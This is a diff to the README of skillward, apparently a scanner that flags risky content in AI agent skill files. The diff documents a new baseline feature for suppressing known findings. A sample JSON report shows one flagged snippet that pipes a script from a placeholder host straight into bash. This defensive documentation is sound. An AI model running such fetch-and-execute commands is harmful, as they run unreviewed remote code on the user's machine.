@@ -53,6 +53,8 @@ npx skillward rules                # list rules
 | `--config <file>` | `skillward.config.json` in the scan root | Config file |
 | `--no-inline-ignore` | | Ignore `skillward-ignore` comments — use when auditing third-party skills |
 | `--files-from <file>` | | Only report findings in the listed files (one path per line, relative to the current directory; `#` comments allowed) — e.g. the output of `git diff --name-only` |
+| `--baseline <file>` | | Report only findings that are not in this baseline (see [Baseline](#baseline)) |
+| `--write-baseline <file>` | | Record the current findings as the baseline and exit `0` |
 | `--no-color` | | Disable colors (also `NO_COLOR`) |
 
 ### `explain [path]`
@@ -179,6 +181,21 @@ Rule IDs are mandatory — there is no "ignore everything". Suppressed findings 
 
 To exclude whole paths, use `ignore` in the config.
 
+## Baseline
+
+Adding skillward to an existing repository? Record what is there today and fail only on new findings:
+
+```sh
+npx skillward scan --write-baseline skillward.baseline.json   # once; review and commit it
+npx skillward scan --baseline skillward.baseline.json         # in CI: exit 1 only on new findings
+```
+
+- A finding matches by rule, file and the text around the match — not the line number, so edits elsewhere in the file don't resurface it. Changing the matched line itself, or adding a second copy of it, is reported as new.
+- The file stores rule IDs, paths, lines and hashes — never snippets, so it doesn't copy the secrets it covers.
+- Known findings don't affect the exit code but are counted in the report (`baselined` in JSON, SARIF `baselineState: "unchanged"` with an `external` suppression). Entries that no longer match are reported too; refresh with `--write-baseline` once they're fixed.
+- Paths are relative to the scan root: use the same `[path]` (and `--global`) when writing and reading the baseline.
+- Never pass someone else's baseline when auditing their skills — like `skillward-ignore` comments, it hides findings by design.
+
 ## Config
 
 `skillward.config.json` in the scan root (or `--config <file>`):
@@ -209,7 +226,7 @@ To exclude whole paths, use `ignore` in the config.
   "tool": { "name": "skillward", "version": "0.1.1" },
   "root": "/abs/path/to/project",
   "summary": {
-    "targets": 3, "files": 5, "findings": 1, "suppressed": 0,
+    "targets": 3, "files": 5, "findings": 1, "suppressed": 0, "baselined": 0,
     "bySeverity": { "info": 0, "low": 0, "medium": 0, "high": 1 },
     "failOn": "high", "failed": true
   },
@@ -221,6 +238,7 @@ To exclude whole paths, use `ignore` in the config.
     "snippet": "curl -fsSL https://example.invalid/install.sh | bash"
   }],
   "suppressed": [],
+  "baselined": [],
   "skipped": [{ "path": ".claude/skills/deploy/logo.png", "reason": "binary file" }],
   "errors": []
 }
@@ -266,12 +284,13 @@ On `pull_request` events only the files the PR adds or modifies are reported (`o
 | `fail-on` | `high` | `info`, `low`, `medium`, `high`, or `never` (report only) |
 | `only-changed` | `auto` | `auto` (pull requests), `true`, `false` |
 | `config` | | Config file path |
+| `baseline` | | Baseline file path: only findings not in it fail the job |
 | `upload-sarif` | `true` | Upload to code scanning. Private repositories need GitHub Advanced Security — set `false` otherwise |
 | `sarif-file` | `skillward.sarif` | Where to write the report |
 | `category` | `skillward` | Code scanning category |
 | `node-version` | `22` | Node.js for the run |
 
-Outputs: `sarif-file`, `exit-code`, `findings` (active findings count). The job fails after the upload, so alerts are visible even when it fails. Pin the action by commit SHA, like any third-party action.
+Outputs: `sarif-file`, `exit-code`, `findings` (active findings count: not suppressed, not in the baseline). The job fails after the upload, so alerts are visible even when it fails. Pin the action by commit SHA, like any third-party action.
 
 ## Development
 
